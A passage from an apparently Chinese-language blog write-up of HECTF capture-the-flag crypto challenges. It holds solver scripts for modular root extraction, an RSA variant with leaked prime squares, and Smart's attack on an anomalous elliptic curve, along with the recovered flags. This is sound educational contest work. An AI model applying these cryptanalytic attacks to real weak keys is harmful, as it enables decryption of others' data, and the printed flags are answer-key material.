operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n----------------------------------------------------------------------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start to run Adleman-Manders-Miller Root Extraction Method'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> o<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> GF<span class="token punctuation">(</span>q<span class="token punctuation">)</span>    o <span class="token operator">=</span> g<span class="token punctuation">(</span>o<span class="token punctuation">)</span>    p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> p <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find p:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> <span class="token number">0</span>    s <span class="token operator">=</span> q <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> s <span class="token operator">%</span> r <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        t <span class="token operator">+=</span> <span class="token number">1</span>        s <span class="token operator">=</span> s <span class="token operator">//</span> r    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find s:&#123;&#125;, t:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        k <span class="token operator">+=</span> <span class="token number">1</span>    alp <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find alp:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>alp<span class="token punctuation">)</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> p <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">**</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> s<span class="token punctuation">)</span>    b <span class="token operator">=</span> o <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">*</span>alp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> p <span class="token operator">^</span> s    h <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">^</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Calculating DLP...'</span><span class="token punctuation">)</span>            j <span class="token operator">=</span> <span class="token operator">-</span> discrete_log<span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Finish DLP...'</span><span class="token punctuation">)</span>        b <span class="token operator">=</span> b <span class="token operator">*</span> <span class="token punctuation">(</span>c<span class="token operator">^</span>r<span class="token punctuation">)</span><span class="token operator">^</span>j        h <span class="token operator">=</span> h <span class="token operator">*</span> c<span class="token operator">^</span>j        c <span class="token operator">=</span> c<span class="token operator">^</span>r    result <span class="token operator">=</span> o<span class="token operator">^</span>alp <span class="token operator">*</span> h    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Find one solution: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">findAllPRoot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    proot <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>proot<span class="token punctuation">)</span> <span class="token operator">&lt;</span> e<span class="token punctuation">:</span>        proot<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> proot<span class="token keyword">def</span> <span class="token function">findAllSolutions</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    all_mp <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> root <span class="token keyword">in</span> proot<span class="token punctuation">:</span>        mp2 <span class="token operator">=</span> mp <span class="token operator">*</span> root <span class="token operator">%</span> p        <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>mp2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> cp<span class="token punctuation">)</span>        all_mp<span class="token punctuation">.</span>add<span class="token punctuation">(</span>mp2<span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> all_mpc <span class="token operator">=</span> <span class="token number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span>p <span class="token operator">=</span> <span class="token number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span>e <span class="token operator">=</span> <span class="token number">2</span>cp <span class="token operator">=</span> c <span class="token operator">%</span> pmp <span class="token operator">=</span> AMM<span class="token punctuation">(</span>cp<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span>p_proot <span class="token operator">=</span> findAllPRoot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span>mps <span class="token operator">=</span> findAllSolutions<span class="token punctuation">(</span>mp<span class="token punctuation">,</span> p_proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mps<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    h <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'HECTF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start CRT...'</span><span class="token punctuation">)</span><span class="token keyword">for</span> mpp <span class="token keyword">in</span> mps<span class="token punctuation">:</span>    solution <span class="token operator">=</span> CRT_list<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>mpp<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span>end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagflag <span class="token operator">=</span> <span class="token string">b'xxx'</span>e <span class="token operator">=</span> <span class="token number">114</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>t <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> tp_<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>q_<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p_='</span><span class="token punctuation">,</span>p_<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q_='</span><span class="token punctuation">,</span>q_<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c='</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n='</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span>p_<span class="token operator">=</span> <span class="token number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span>q_<span class="token operator">=</span> <span class="token number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><span class="token number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span>c<span class="token operator">=</span> <span class="token number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span>n<span class="token operator">=</span> <span class="token number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">114</span>p_<span class="token operator">=</span> <span class="token number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span>q_<span class="token operator">=</span> <span class="token number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span>c<span class="token operator">=</span> <span class="token number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span>n<span class="token operator">=</span> <span class="token number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span>p <span class="token operator">=</span> <span class="token number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span>q <span class="token operator">=</span> <span class="token number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span>t <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>u <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token operator">//</span><span class="token number">6</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token operator">//</span><span class="token number">6</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#HECTF&#123;Congratulation!!you_find_flag&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目直接给出了flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">HECTF<span class="token punctuation">&#123;</span>409bd7db0eb11a54e47eb5d0c9c371900eb11a54e47eb5d02e<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token operator">=</span><span class="token number">235322474717419</span>a<span class="token operator">=</span><span class="token number">0</span>b<span class="token operator">=</span><span class="token number">8856682</span>k<span class="token operator">=</span>E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>P <span class="token operator">=</span> E<span class="token punctuation">.</span>random_point<span class="token punctuation">(</span><span class="token punctuation">)</span>P<span class="token punctuation">.</span>order<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>pQ<span class="token operator">=</span>k<span class="token operator">*</span>Paes_key<span class="token operator">=</span>k<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P:"</span><span class="token punctuation">,</span>P<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q:"</span><span class="token punctuation">,</span>Q<span class="token punctuation">)</span><span class="token comment">#P=E(180571547161769,227820272156445)</span><span class="token comment">#Q=E(76765539897460,69715189045993)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> base64aes_key <span class="token operator">=</span> <span class="token string">b'???'</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        text <span class="token operator">+=</span> <span class="token string">b' '</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">pad_key</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        key <span class="token operator">+=</span> <span class="token string">b' '</span>    <span class="token keyword">return</span> keyaes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad_key<span class="token punctuation">(</span>aes_key<span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>plain_text <span class="token operator">=</span> <span class="token string">b'???'</span>enc_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">)</span>enc_text_b64<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc_text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_text_b64<span class="token punctuation">)</span>bXaw<span class="token operator">/</span>g8fD7taMjlL<span class="token operator">/</span>OyqUJluD6dZI5GkZb9RrE5GQk8<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token operator">=</span><span class="token number">235322474717419</span>a<span class="token operator">=</span><span class="token number">0</span>b<span class="token operator">=</span><span class="token number">8856682</span>E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>P<span class="token operator">=</span>E<span class="token punctuation">(</span><span class="token number">180571547161769</span><span class="token punctuation">,</span><span class="token number">227820272156445</span><span class="token punctuation">)</span>Q<span class="token operator">=</span>E<span class="token punctuation">(</span><span class="token number">76765539897460</span><span class="token punctuation">,</span><span class="token number">69715189045993</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">SmartAttack</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span>Q<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    E <span class="token operator">=</span> P<span class="token punctuation">.</span>curve<span class="token punctuation">(</span><span class="token punctuation">)</span>    Eqp <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>Qp<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token 